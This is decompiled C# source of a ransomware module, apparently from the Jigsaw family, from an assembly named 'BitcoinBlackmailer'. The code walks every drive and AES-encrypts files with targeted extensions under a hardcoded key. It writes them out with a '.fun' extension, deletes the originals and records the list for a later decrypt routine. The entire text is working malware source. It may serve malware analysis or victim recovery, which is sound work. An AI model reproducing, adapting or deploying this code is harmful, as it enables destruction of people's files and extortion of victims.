// Decompiled with JetBrains decompiler
// Type: Main.Tools.Locker
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Main.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace Main.Tools
{
  internal static class Locker
  {
    private static readonly string EncryptedFileListPath = Locker.smethod_6(Config.WorkFolderPath, "EncryptedFileList.txt");
    private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();
    private const string EncryptionFileExtension = ".fun";
    private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

    internal static void EncryptFileSystem()
    {
      HashSet<string> extensionsToEncrypt = new HashSet<string>(Locker.GetExtensionsToEncrypt());
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      IEnumerator<string> enumerator = ((IEnumerable<DriveInfo>) Locker.smethod_0()).Select<DriveInfo, string>((Func<DriveInfo, string>) (drive => Locker.\u003C\u003Ec.smethod_1((FileSystemInfo) Locker.\u003C\u003Ec.smethod_0(drive)))).GetEnumerator();
      try
      {
        while (Locker.smethod_1((IEnumerator) enumerator))
          Locker.EncryptFiles(enumerator.Current, ".fun", extensionsToEncrypt);
      }
      finally
      {
        if (enumerator != null)
          Locker.smethod_2((IDisposable) enumerator);
      }
      if (Locker.smethod_3(Locker.EncryptedFileListPath))
        return;
      string[] array = Locker.EncryptedFiles.ToArray<string>();
      Locker.smethod_4(Locker.EncryptedFileListPath, array);
    }

    internal static HashSet<string> GetEncryptedFiles()
    {
      HashSet<string> encryptedFiles = new HashSet<string>();
      if (Locker.smethod_3(Locker.EncryptedFileListPath))
      {
        foreach (string str in Locker.smethod_5(Locker.EncryptedFileListPath))
          encryptedFiles.Add(str);
      }
      return encryptedFiles;
    }

    private static string CreateFileSystemSimulation()
    {
      string string_0 = Locker.smethod_6(Config.WorkFolderPath, "FileSystemSimulation");
      if (!Locker.smethod_7(string_0))
        Locker.smethod_8(string_0);
      TextWriter textWriter1 = (TextWriter) Locker.smethod_9(Locker.smethod_6(string_0, "TxtTest.txt"), true);
      try
      {
        Locker.smethod_10(textWriter1, "I am a txt test.");
      }
      finally
      {
        if (textWriter1 != null)
          Locker.smethod_2((IDisposable) textWriter1);
      }
      TextWriter textWriter2 = (TextWriter) Locker.smethod_9(Locker.smethod_6(string_0, "NotTxtTest.nottxt"), true);
      try
      {
        Locker.smethod_10(textWriter2, "I am NOT a txt test.");
      }
      finally
      {
        if (textWriter2 != null)
          Locker.smethod_2((IDisposable) textWriter2);
      }
      return string_0;
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
      HashSet<string> extensionsToEncrypt1 = new HashSet<string>();
      string extensionsToEncrypt2 = Resources.ExtensionsToEncrypt;
      string[] string_1 = new string[2]
      {
        Locker.smethod_11(),
        " "
      };
      foreach (string string_0 in ((IEnumerable<string>) Locker.smethod_12(extensionsToEncrypt2, string_1, StringSplitOptions.RemoveEmptyEntries)).ToList<string>())
        extensionsToEncrypt1.Add(Locker.smethod_13(string_0));
      extensionsToEncrypt1.Remove(".fun");
      return (IEnumerable<string>) extensionsToEncrypt1;
    }

    private static IEnumerable<string> GetFiles(string path)
    {
      Queue<string> queue = new Queue<string>();
      queue.Enqueue(path);
      while (queue.Count > 0)
      {
        path = queue.Dequeue();
        try
        {
          // ISSUE: reference to a compiler-generated method
          foreach (string str in Locker.\u003CGetFiles\u003Ed__8.smethod_2(path))
            queue.Enqueue(str);
        }
        catch (Exception ex)
        {
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          Locker.\u003CGetFiles\u003Ed__8.smethod_4(Locker.\u003CGetFiles\u003Ed__8.smethod_3(), (object) ex);
        }
        string[] strArray1 = (string[]) null;
        try
        {
          // ISSUE: reference to a compiler-generated method
          strArray1 = Locker.\u003CGetFiles\u003Ed__8.smethod_5(path);
        }
        catch (Exception ex)
        {
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          Locker.\u003CGetFiles\u003Ed__8.smethod_4(Locker.\u003CGetFiles\u003Ed__8.smethod_3(), (object) ex);
        }
        if (strArray1 != null)
        {
          string[] strArray = strArray1;
          for (int index = 0; index < strArray.Length; ++index)
            yield return strArray[index];
          strArray = (string[]) null;
        }
      }
    }

    private static void EncryptFiles(
      string dirPath,
      string encryptionExtension,
      HashSet<string> extensionsToEncrypt)
    {
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      IEnumerator<string> enumerator = Locker.GetFiles(dirPath).SelectMany((Func<string, IEnumerable<string>>) (file => (IEnumerable<string>) extensionsToEncrypt), (file, ext) => new
      {
        file = file,
        ext = ext
      }).Where(_param1 => Locker.\u003C\u003Ec.smethod_2(_param1.file, _param1.ext)).Select(_param1 => _param1.file).Select(file => new
      {
        file = file,
        fi = Locker.\u003C\u003Ec.smethod_3(file)
      }).Where(t => Locker.\u003C\u003Ec.smethod_4(t.fi) < 10000000L).Select(t => t.file).GetEnumerator();
      try
      {
        while (Locker.smethod_1((IEnumerator) enumerator))
        {
          string current = enumerator.Current;
          try
          {
            if (Locker.EncryptFile(current, encryptionExtension))
              Locker.EncryptedFiles.Add(current);
          }
          catch
          {
          }
        }
      }
      finally
      {
        if (enumerator != null)
          Locker.smethod_2((IDisposable) enumerator);
      }
    }

    internal static void DecryptFiles(string encryptionExtension)
    {
      foreach (string encryptedFile in Locker.GetEncryptedFiles())
      {
        try
        {
          string str = Locker.smethod_14(encryptedFile, encryptionExtension);
          Locker.DecryptFile(str, encryptionExtension);
          Locker.smethod_15(str);
        }
        catch
        {
        }
      }
      Locker.smethod_15(Locker.EncryptedFileListPath);
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
      try
      {
        if (Config.StartMode != Config.StartModeType.Debug && (Locker.smethod_16(path, Config.WorkFolderPath, StringComparison.InvariantCulture) || Locker.smethod_16(path, "C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
          return false;
        AesCryptoServiceProvider cryptoServiceProvider = Locker.smethod_17();
        try
        {
          Locker.smethod_19((SymmetricAlgorithm) cryptoServiceProvider, Locker.smethod_18("OoIsAwwF23cICQoLDA0ODe=="));
          AesCryptoServiceProvider symmetricAlgorithm_0 = cryptoServiceProvider;
          byte[] numArray = new byte[16];
          // ISSUE: field reference
          Locker.smethod_20((Array) numArray, __fieldref (\u003CPrivateImplementationDetails\u003E.FBD2112E56A53790B3D53B084795822F604F11FC));
          Locker.smethod_21((SymmetricAlgorithm) symmetricAlgorithm_0, numArray);
          Locker.EncryptFile((SymmetricAlgorithm) cryptoServiceProvider, path, Locker.smethod_14(path, encryptionExtension));
        }
        finally
        {
          if (cryptoServiceProvider != null)
            Locker.smethod_2((IDisposable) cryptoServiceProvider);
        }
      }
      catch
      {
        return false;
      }
      try
      {
        Locker.smethod_15(path);
      }
      catch (Exception ex)
      {
        return false;
      }
      return true;
    }

    private static void DecryptFile(string path, string encryptionExtension)
    {
      try
      {
        if (!Locker.smethod_22(path, encryptionExtension))
          return;
        string outputFile = Locker.smethod_24(path, Locker.smethod_23(path) - 4);
        AesCryptoServiceProvider cryptoServiceProvider = Locker.smethod_17();
        try
        {
          Locker.smethod_19((SymmetricAlgorithm) cryptoServiceProvider, Locker.smethod_18("OoIsAwwF23cICQoLDA0ODe=="));
          AesCryptoServiceProvider symmetricAlgorithm_0 = cryptoServiceProvider;
          byte[] numArray = new byte[16];
          // ISSUE: field reference
          Locker.smethod_20((Array) numArray, __fieldref (\u003CPrivateImplementationDetails\u003E.FBD2112E56A53790B3D53B084795822F604F11FC));
          Locker.smethod_21((SymmetricAlgorithm) symmetricAlgorithm_0, numArray);
          Locker.DecryptFile((SymmetricAlgorithm) cryptoServiceProvider, path, outputFile);
        }
        finally
        {
          if (cryptoServiceProvider != null)
            Locker.smethod_2((IDisposable) cryptoServiceProvider);
        }
      }
      catch
      {
        return;
      }
      try
      {
        Locker.smethod_15(path);
      }
      catch (Exception ex)
      {
      }
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      byte[] byte_0 = new byte[65536];
      FileStream fileStream1 = Locker.smethod_25(inputFile, FileMode.Open);
      try
      {
        FileStream fileStream2 = Locker.smethod_25(outputFile, FileMode.Create);
        try
        {
          CryptoStream cryptoStream = Locker.smethod_27((Stream) fileStream2, Locker.smethod_26(alg), CryptoStreamMode.Write);
          try
          {
            int int_1;
            do
            {
              int_1 = Locker.smethod_28((Stream) fileStream1, byte_0, 0, byte_0.Length);
              if (int_1 != 0)
                goto label_5;
label_4:
              continue;
label_5:
              Locker.smethod_29((Stream) cryptoStream, byte_0, 0, int_1);
              goto label_4;
            }
            while (int_1 != 0);
          }
          finally
          {
            if (cryptoStream != null)
              Locker.smethod_2((IDisposable) cryptoStream);
          }
        }
        finally
        {
          if (fileStream2 != null)
            Locker.smethod_2((IDisposable) fileStream2);
        }
      }
      finally
      {
        if (fileStream1 != null)
          Locker.smethod_2((IDisposable) fileStream1);
      }
    }

    private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      byte[] byte_0 = new byte[65536];
      FileStream fileStream1 = Locker.smethod_25(inputFile, FileMode.Open);
      try
      {
        FileStream fileStream2 = Locker.smethod_25(outputFile, FileMode.Create);
        try
        {
          CryptoStream cryptoStream = Locker.smethod_27((Stream) fileStream2, Locker.smethod_30(alg), CryptoStreamMode.Write);
          try
          {
            int int_1;
            do
            {
              int_1 = Locker.smethod_28((Stream) fileStream1, byte_0, 0, byte_0.Length);
              if (int_1 != 0)
                goto label_5;
label_4:
              continue;
label_5:
              Locker.smethod_29((Stream) cryptoStream, byte_0, 0, int_1);
              goto label_4;
            }
            while (int_1 != 0);
          }
          finally
          {
            if (cryptoStream != null)
              Locker.smethod_2((IDisposable) cryptoStream);
          }
        }
        finally
        {
          if (fileStream2 != null)
            Locker.smethod_2((IDisposable) fileStream2);
        }
      }
      finally
      {
        if (fileStream1 != null)
          Locker.smethod_2((IDisposable) fileStream1);
      }
    }

    static DriveInfo[] smethod_0() => DriveInfo.GetDrives();

    static bool smethod_1(IEnumerator ienumerator_0) => ienumerator_0.MoveNext();

    static void smethod_2(IDisposable idisposable_0) => idisposable_0.Dispose();

    static bool smethod_3(string string_0) => File.Exists(string_0);

    static void smethod_4(string string_0, string[] string_1) => File.WriteAllLines(string_0, string_1);

    static string[] smethod_5(string string_0) => File.ReadAllLines(string_0);

    static string smethod_6(string string_0, string string_1) => Path.Combine(string_0, string_1);

    static bool smethod_7(string string_0) => Directory.Exists(string_0);

    static DirectoryInfo smethod_8(string string_0) => Directory.CreateDirectory(string_0);

    static StreamWriter smethod_9(string string_0, bool bool_0) => new StreamWriter(string_0, bool_0);

    static void smethod_10(TextWriter textWriter_0, string string_0) => textWriter_0.WriteLine(string_0);

    static string smethod_11() => Environment.NewLine;

    static string[] smethod_12(
      string string_0,
      string[] string_1,
      StringSplitOptions stringSplitOptions_0)
    {
      return string_0.Split(string_1, stringSplitOptions_0);
    }

    static string smethod_13(string string_0) => string_0.Trim();

    static string smethod_14(string string_0, string string_1) => string_0 + string_1;

    static void smethod_15(string string_0) => File.Delete(string_0);

    static bool smethod_16(string string_0, string string_1, StringComparison stringComparison_0) => string_0.StartsWith(string_1, stringComparison_0);

    static AesCryptoServiceProvider smethod_17() => new AesCryptoServiceProvider();

    static byte[] smethod_18(string string_0) => Convert.FromBase64String(string_0);

    static void smethod_19(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0) => symmetricAlgorithm_0.Key = byte_0;

    static void smethod_20(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0) => RuntimeHelpers.InitializeArray(array_0, runtimeFieldHandle_0);

    static void smethod_21(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0) => symmetricAlgorithm_0.IV = byte_0;

    static bool smethod_22(string string_0, string string_1) => string_0.EndsWith(string_1);

    static int smethod_23(string string_0) => string_0.Length;

    static string smethod_24(string string_0, int int_0) => string_0.Remove(int_0);

    static FileStream smethod_25(string string_0, FileMode fileMode_0) => new FileStream(string_0, fileMode_0);

    static ICryptoTransform smethod_26(SymmetricAlgorithm symmetricAlgorithm_0) => symmetricAlgorithm_0.CreateEncryptor();

    static CryptoStream smethod_27(
      Stream stream_0,
      ICryptoTransform icryptoTransform_0,
      CryptoStreamMode cryptoStreamMode_0)
    {
      return new CryptoStream(stream_0, icryptoTransform_0, cryptoStreamMode_0);
    }

    static int smethod_28(Stream stream_0, byte[] byte_0, int int_0, int int_1) => stream_0.Read(byte_0, int_0, int_1);

    static void smethod_29(Stream stream_0, byte[] byte_0, int int_0, int int_1) => stream_0.Write(byte_0, int_0, int_1);

    static ICryptoTransform smethod_30(SymmetricAlgorithm symmetricAlgorithm_0) => symmetricAlgorithm_0.CreateDecryptor();
  }
}
